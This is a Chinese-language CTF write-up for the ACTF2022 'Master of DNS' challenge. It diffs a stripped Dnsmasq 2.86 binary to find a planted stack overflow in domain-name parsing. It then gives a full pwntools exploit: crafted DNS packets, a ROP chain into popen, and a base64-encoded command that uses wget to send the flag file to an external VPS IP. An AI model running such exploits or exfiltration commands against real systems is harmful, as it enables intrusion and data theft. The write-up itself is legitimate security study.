# Master of DNS

> Category: PWN & RealWorld
>
> Date: 2022/07/17
>
> Authorship: ACTF2022
>

## 0x00 前言

比赛的时候正好期末考试，错过了AAA的高质量赛题了属于是

这题再比赛的时候只有3解，但是依然被AAA战队评价为简单题，主要涉及到了RealWorld的程序导致逆向和找洞的难度比较大且不是模板题难以快速理清楚思路，但是我个人认为这种偏向RealWorld的题目还是要比很多pwn的模板题各种花式Glibc利用要有意思不少的。

## 0x01 分析

题目附件给了一个去符号表的elf文件和dns配置文件以及一个readme，同时给出hint给出了开源项目的地址。

同时ELF文件是32位且关闭了canary和PIE。

由于题目给的是开源项目，且版本较高没有公开的0day或者1day，可以猜测是作者自己埋的洞

分析题目附件给出的版本和编译方式：

![](https://pic.imgdb.cn/item/62d433bdf54cd3f9370587cb.png)

结合给出的hint，分析得出题目是 Dnsmasq 2.86

![](https://pic.imgdb.cn/item/62d4343ef54cd3f937063661.png)

根据查找字符串GCC可以看出用的Ubuntu20.04的GCC，同时我本地的Ubuntu20的gcc也是这个版本，可以确定源文件就是Ubuntu20.04和自带gcc编译的。

## 0x02 BinDiff

先下载题目版本的开源项目源码

````bash
$ git clone git://thekelleys.org.uk/dnsmasq.git 
$ git checkout v2.86
````

之后修改MarkFile参数 ~~(该说不说makefile语法真抽象)~~

```makefile
CFLAGS        = -m32 -fno-stack-protector -Wall -W 
LDFLAGS       = -m32 -no-pie -s
```

> -s 是去符号表 不过不去符号bindiff反而看起来清楚一点

然后编译``make``

![image-20220718003033968](C:/Users/25786/AppData/Roaming/Typora/typora-user-images/image-20220718003033968.png)

之后上BinDiff对比，找出相似度不为1的函数一个一个看过去

![](https://pic.imgdb.cn/item/62d43de2f54cd3f93716118f.png)

可以再 extract_name中找到

![](https://pic.imgdb.cn/item/62d43ea6f54cd3f93717669d.png)

`sub_0804F345`明显多了一个`memcpy`函数，联想到这题没开canary和pie，可以考虑是这里出现了栈溢出。

![](https://pic.imgdb.cn/item/62d43f58f54cd3f93718acf7.png)

dest是栈空间。src是传入参数。n是变量且最大可以达到1024

![image-20220718010022772](C:/Users/25786/AppData/Roaming/Typora/typora-user-images/image-20220718010022772.png)

但是dest的栈上空间只有848

![](https://pic.imgdb.cn/item/62d4404cf54cd3f9371a1986.png)

明显的栈溢出。

## 0x03 漏洞分析

由于src是函数传入参数，我们并不知道这个参数是啥，所以选择直接gdb下个断点看看正常情况下这个参数是啥

正常用他的配置文件启动，查看pid之后用gdb给attach上去

![](https://pic.imgdb.cn/item/62d44293f54cd3f9371d6c42.png)

没有开启PIE断点可以直接下

![](https://pic.imgdb.cn/item/62d44300f54cd3f9371e04d8.png)

可以看到src就是传入的域名

## 0x04 栈溢出利用 

这种题目需要udp交互而且写脚本的花还需要手动发包，我们得抓一个包下来看看发包的格式。

首先用`tcpdump`抓取本地回环地址的一个数据包

````bash
$ tcpdump -nnvv -i lo port 9999 -w ./dnstmp.cap
````

之后使用`dig @127.0.0.1 -p 9999 baidu.com`发起DNS请求，wireshark打开抓取的包

![](https://pic.imgdb.cn/item/62d4f904f54cd3f937cb541f.png)

不过`dig`命令每个域名label长度不能超过63字节。

![](https://pic.imgdb.cn/item/62d4f88df54cd3f937cab96e.png)

但是一个域名可以有多个label，用`.`隔开

![](https://pic.imgdb.cn/item/62d5122bf54cd3f937efa4cd.png)

观察正常的报文段（Data段，去掉udp头）

```
0000   4a 44 01 20 00 01 00 00 00 00 00 01 05 62 61 69   JD. .........bai
0010   64 75 03 63 6f 6d 00 00 01 00 01 00 00 29 10 00   du.com.......)..
0020   00 00 00 00 00 0c 00 0a 00 08 e1 c5 a8 e3 04 7e   ...............~
0030   4e 5b                                             N[
```

报文可以分成3个部分：head domain 和 end

```
Head : 4a4401200001000000000001
```

````
Domain : 05626169647503636f6d
````

````
End : 0000010001000029100000000000000c000a0008e1c5a8e3047e4e5b
````

前后都不需要管，只需要处理中间的Domain段即可

Domain会把一个域名通过`.`分成多个label，每个label最长不能超过63字节，算上最前面的label长度也就是64字节。这里可以用pwntools构造一个POC发过去试下：

````python
# -*- coding: utf-8 -*-
from pwn import *
context(os='linux',arch='i386')
context.log_level = 'debug'
p = remote("127.0.0.1","9999",typ='udp')

head = '4a4401200001000000000001'
exp = ('3f'+'61'*0x3f)*0x10
end = '0000010001000029100000000000000c000a0008e1c5a8e3047e4e5b'
payload = head + exp + end 
data = payload.decode('hex')
p.send(data)
````

数据包解析正确，这里的n=0x400，而根据IDApro分析这里的栈空间只有0x350，溢出了0x50个字节。

![](https://pic.imgdb.cn/item/62d513eef54cd3f937f2c85a.png)

调节下偏移覆盖EIP

![](https://pic.imgdb.cn/item/62d51a3df54cd3f937fc2269.png)

之后就是喜闻乐见的rop环节

不过这题是真实网络环境且DNS服务器使用UDP协议传输，没法获得建立连接的文件描述符，所以可以采用wget把flag发给自己的vps的方法得到flag

````bash
$ wget http://xxx.xxx.xxx.xxx:9999/`cat flag`
````

不过由于不能发送`.`，不然`.`会被DNS解析之后替换成长度，所以可以选择base64之后发过去

````bash
$ echo "d2dldCBodHRwOi8vNjQuMjcuNi4xOTA6OTk5OS9gY2F0IC4vZmxhZ2A=" | base64 -d | sh
````

之后开始寻找好用的gadget

使用IDA pro 的Search-> text分别查找`call`和`_popen`可以找到：

![](https://pic.imgdb.cn/item/62d55d4df54cd3f9375d821f.png)

这样edx和eax就成为了调用`popen`时候的参数，我们的目标是调用

````c
popen('echo "d2dldCBodHRwOi8vNjQuMjcuNi4xOTA6OTk5OS9gY2F0IC4vZmxhZ2A=" | base64 -d | sh',"r")
````

观察栈溢出崩溃的时候的寄存器：

![](https://pic.imgdb.cn/item/62d55e2ff54cd3f9375e915f.png)

可以看到edx正好指向我的输入内容，但是eax的内容不理想，寻找去能够交换eax和edx的gadget：

````assembly
0x080525db: mov eax, 0; pop ebp; ret; 
````

这样可以修改eax为0

````assembly
0x0804b639: add eax, edx; add esp, 0x10; pop ebx; pop ebp; ret;
````

这样eax就被修改为了edx的值，之后再尝试控制edx的值到字符串 'r' 。

在bss上随便找下字符串‘r’的地址

![](https://pic.imgdb.cn/item/62d569d3f54cd3f9376cbdeb.png)

最后可以实现

![](https://pic.imgdb.cn/item/62d576d4f54cd3f9377ca091.png)

但是还是炸了，，，，，

原因是我把参数字符串保存在了栈的低地址，调用popen函数的时候有可能会覆盖掉这些字符串，从而出现错误。

所以我们考虑需要把这个字符串放到更低的位置，但是同时我们就需要增大eax的值。

不过正好由于我们是用add来控制edx的值，再把edx清0之后再赋eax一个初始值，然后再add edx就可以修改eax。

把字符串放到调用popen函数的下面（栈的高地址）最终反弹flag

![](https://pic.imgdb.cn/item/62d59be5f54cd3f937a09a66.png)

## 0x05 Exp

````python
# -*- coding: utf-8 -*-
from pwn import *
context(os='linux',arch='i386')
context.log_level = 'debug'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF("./dns")

local = 1

if local:
    p = remote("127.0.0.1","9999",typ='udp')
else:
    p = remote("","")

def debug(p):
    if local:
        gdb.attach(p)
    else:
        pass

head = '4a4401200001000000000001'.decode('hex')
head += (('3f'+'61'*0x3f)*0xe).decode('hex')
head += (('04'+'61'*0x4)+'38').decode('hex')
end = '0000010001000029100000000000000c000a0008e1c5a8e3047e4e5b'

# 0x080525db: mov eax, 0; pop ebp; ret; 
# 0x08059d44: pop eax; ret;
# 0x0804b639: add eax, edx; add esp, 0x10; pop ebx; pop ebp; ret;
# 0x08071802: push edx; push eax; call _popen
# 0x080a650c: "r"
# 0x0807ec72: pop edx; ret;
# 0x08094d60: add eax, 0x11038; nop; pop ebp; ret;
# 0xFFFEF386 + 0x11038 == 0x1000003BE == 0x3BE
# 0x0804c2bf: pop edi; pop ebp; ret; 
exp = ""
exp += p32(0x08059d44)+p32(0xFFFEF386) # pop eax; ret;
exp += p32(0x08094d60)+p32(0xdeadbeaf) # add eax, 0x11038; nop; pop ebp; ret;
exp += p32(0x0804b639)+p32(0xdeadbeaf)*6 # add eax, edx; add esp, 0x10; pop ebx; pop ebp; ret;
exp += p32(0x0807ec72)+p32(0x080a650c) # pop edx; ret; "r"
exp += p32(0x08071802)+p8(0x3e) # push edx; push eax; call _popen
print hex(len(exp))
cmd = 'echo "d2dldCA2NC4yNy42LjE5MDo5OTk5L2BjYXQgZipg"|base64 -d|sh|a'.encode()
print hex(len(cmd))
payload = head + exp + cmd + end.decode('hex')
p.send(payload)

# debug(p)
p.interactive()
````

## 0x06 总结

虽然这篇文章涉及rop的部分很少，但是是我最花时间的~~（调了一整天rop）~~

首先是面对真实网络环境，而且是没有一个固定文件描述符的UDP连接，反弹flag可以选择使用

````bash
$ wget http://xxx.xxx.xxx.xxx:9999/`cat flag`
````

这种方式去给自己vps发包。

虽然32位程序函数传参方式是栈传参，但是可以IDAPro里text查找去寻找调用我们需要的函数的地方，也许他会在前面放几个`push`操作，把栈传参当作寄存器传参处理。

寄存器传参的好处是我们可以拿不到一些动态的地址，但是观察程序崩溃点可以找找当时寄存器的环境，也许就有我们需要的地址。对于这些地址的处理可以灵活利用`mov`,`xchg`,`add`,`xor`等相互处理这些寄存器，例如如果没有`mov`和`xchg`的时候可以考虑先把一个寄存器清0，之后使用`add`来达到`mov`的效果。同理为了避免出现`\x00`字节，可以利用寄存器的整数溢出来构造自己需要的偏移，例如这题里的``0xFFFEF386 + 0x11038 == 0x1000003BE == 0x3BE``就是很好的例子。

同时需要考虑如果我们把参数放到栈的低地址，会出现由于我们新调用的函数存在一定的对栈的操作，我们的参数可能会被覆盖，尽可能把我们需要的参数放到栈的高地址。

关于BinDiff没啥多介绍的，毕竟这是我第一次用这个玩意（笑）。但是在编译原程序的时候要先测试出版本号和编译器版本号，已经检查题目的保护开启情况而修改我们自己编译的时候的Makefile。
